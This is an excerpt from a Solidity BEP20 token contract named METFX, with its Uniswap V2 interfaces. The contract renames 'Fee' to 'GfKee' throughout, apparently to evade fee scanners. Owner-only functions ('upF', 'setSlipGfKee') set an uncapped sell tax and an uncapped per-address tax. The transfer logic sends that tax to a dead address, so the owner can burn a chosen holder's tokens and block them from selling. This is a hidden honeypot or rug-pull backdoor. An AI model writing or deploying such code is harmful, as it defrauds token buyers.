...
interface IUniswapV2Factory {
    ...
    function GfKeeTo() external view returns (address);
    function GfKeeToSetter() external view returns (address);
    ...
    function setGfKeeTo(address) external;
    function setGfKeeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingGfKeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingGfKeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingGfKeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingGfKeeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingGfKeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract METFX is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellGfKee = 0;

    uint256 private _defaultBuyGfKee = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipGfKee;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellGfKee = _value;
    }

    function setSlipGfKee(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipGfKee[_address] = _value;
    }

    function getSlipGfKee(address _address) external view onlyownar returns (uint256) {
        return _slipGfKee[_address];
    }


    function setMAccountGfKee(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountGfKee(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradeGfKeeAmount = 0;

        if (rF) {
            uint256 tradeGfKee = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradeGfKee = _defaultSellGfKee;
                }
                if (from == uniswapV2Pair) {

                    tradeGfKee = _defaultBuyGfKee;
                }
            }
            if (_slipGfKee[from] > 0) {
                tradeGfKee = _slipGfKee[from];
            }

            tradeGfKeeAmount = _Amount.mul(tradeGfKee).div(100);
        }


        if (tradeGfKeeAmount > 0) {
            _balances[from] = _balances[from].sub(tradeGfKeeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradeGfKeeAmount);
            emit Transfer(from, _deadAddress, tradeGfKeeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradeGfKeeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradeGfKeeAmount);
        emit Transfer(from, _to, _Amount - tradeGfKeeAmount);
    }
